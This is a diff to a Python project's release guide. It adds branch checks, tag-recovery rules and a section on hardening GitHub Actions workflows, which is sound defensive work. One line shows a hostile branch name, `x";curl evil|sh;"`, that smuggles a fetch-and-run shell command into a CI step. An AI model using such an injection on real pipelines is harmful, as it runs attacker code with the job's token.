@@ -12,8 +12,9 @@ handles version bumps, the release PR, tagging, and triggering the PyPI publish 
 │  1. Validation       version format, clean tree, tag available  │
 │  2. Quality          ruff format check + pytest                 │
 │  3. Changelog        verify entry exists for X.Y.Z              │
-│  4. Update           bump pyproject.toml + __init__.py          │
-│  5. Git              branch, commit, push, open PR              │
+│  4. Update           cut release/vX.Y.Z, then bump the version  │
+│                      in pyproject.toml + __init__.py            │
+│  5. Git              commit, push, open PR                      │
 │  6. Merge            wait for PR CI, squash-merge               │
 │  7. CI on main       wait for post-merge CI to pass             │
 │  8. Tag + Release    push tag, wait for tag-protection,         │
@@ -34,7 +35,9 @@ handles version bumps, the release PR, tagging, and triggering the PyPI publish 
    git pull --ff-only
    ```
 
-2. Ensure the working tree is clean — the script refuses to run with uncommitted changes.
+2. Ensure the working tree is clean — the script refuses to run with uncommitted changes — and that
+   you are on `main` (or `master`). **It stops on any other branch**: the release branch is cut from
+   where you are, so a feature branch would put its unrelated commits into the release PR.
 3. Confirm `gh` CLI is installed and authenticated (`gh auth status`). Phases 6–8 require it.
 
 ## Step 1: Update the Changelog
@@ -191,8 +194,41 @@ recovery paths:
 - **Phase 7 fails (main CI red after merge)**: investigate immediately. Tag has not been pushed yet,
   so PyPI is unaffected. Once main is green again, re-run the script with the same version to resume
   from phase 7.
+- **Re-running after the tag was pushed** resumes at phase 8, but first checks that the remote tag
+  points at your `HEAD`. A tag on any other commit is a conflict and stops the script: check out the
+  released commit (the merge on `main`) and run it again.
 - **Phase 8 fails (tag-protection)**: the tag is already pushed. Investigate the failing check; do
   not delete the tag without understanding why protection failed.
+
+## Workflow Safety
+
+These rules keep a compromised branch name, action or dispatch from publishing or running code:
+
+- **PyPI only after the tag gate.** A normal release publishes from a `workflow_run` once
+  `tag-protection.yml` passes for a `v*` tag on `main`; that run's ref is `main`, not the tag. A
+  hand dispatch of `publish.yml` publishes to real PyPI only from a `v*` tag, as the v0.4.3 recovery
+  did, and a Test PyPI run (`test_pypi: true`) may start from any ref. Optional hardening in the
+  repository settings (Settings → Environments → `pypi` → Deployment branches and tags): allow
+  `main` **and** the tag pattern `v*`. Never tags alone, or the normal release (which runs on
+  `main`) is blocked. A workflow cannot enforce this for itself.
+- **Branch names are data, not script.** `${{ github.head_ref }}`, `${{ github.base_ref }}` and the
+  like are passed through `env:` and read as `"$VAR"`. Writing them inside a `run:` block lets a
+  branch named `x";curl evil|sh;"` run commands with the job's token.
+- **A skipped test job is not a pass.** `scripts/gate_checks.py ci-status` needs at least one
+  `test (…)` run that succeeded, and a failed `Lint` fails the gate. If lint fails, the test matrix
+  is skipped, and an all-skipped matrix once read as success.
+- **The local pre-push check and the CI gate agree.** `scripts/verify-tag-ci.sh` (the pre-push hook)
+  asks `gate_checks.py ci-status`, the same decision as the CI gate, over up to 100 check runs. It
+  is advisory: with no `gh`, or `gh` not signed in, it says so and lets the push through, and the
+  server-side gate (`tag-protection.yml`) still decides.
+- **The tag must be an ancestor of `origin/main`** (`git merge-base --is-ancestor`), not merely
+  appear in a branch whose name contains `origin/main`.
+- **Actions are pinned to commit SHAs**, with the version in a trailing comment, because a tag or
+  branch such as `@v4` or `@release/v1` can be moved. `publish.yml` holds `id-token: write`, so an
+  unpinned publish action could mint a PyPI token. Dependabot (`.github/dependabot.yml`) opens a PR
+  when a pinned action has a new release.
+- **Every workflow declares `permissions:`** at the top, `contents: read` unless a job needs more.
+  `tests/test_workflows.py` checks the last three rules.
 
 ## When _Not_ to Use the Script
 
@@ -201,7 +237,7 @@ Use the script for normal releases. Hand-edit only when:
 - Recovering from a botched release where the tag/PyPI state is inconsistent. Document what happened
   in the changelog or a follow-up commit so the next release flow has context.
 - Cutting a Test PyPI release for verification — use the manual `workflow_dispatch` on `publish.yml`
-  with `test_pypi: true`.
+  with `test_pypi: true`. A real PyPI publish by hand must also run from a `v*` tag.
 
 ## Related Files
 
@@ -209,5 +245,7 @@ Use the script for normal releases. Hand-edit only when:
 - `.github/workflows/ci.yml` — runs on PRs and pushes to main
 - `.github/workflows/tag-protection.yml` — gates tag pushes
 - `.github/workflows/publish.yml` — builds and uploads to PyPI
+- `.github/dependabot.yml` — keeps the pinned action SHAs current
+- `tests/test_workflows.py` — checks the workflow safety rules above
 - `pyproject.toml` — version source (alongside `__init__.py`)
 - `src/ai_launcher/__init__.py` — version source (alongside `pyproject.toml`)
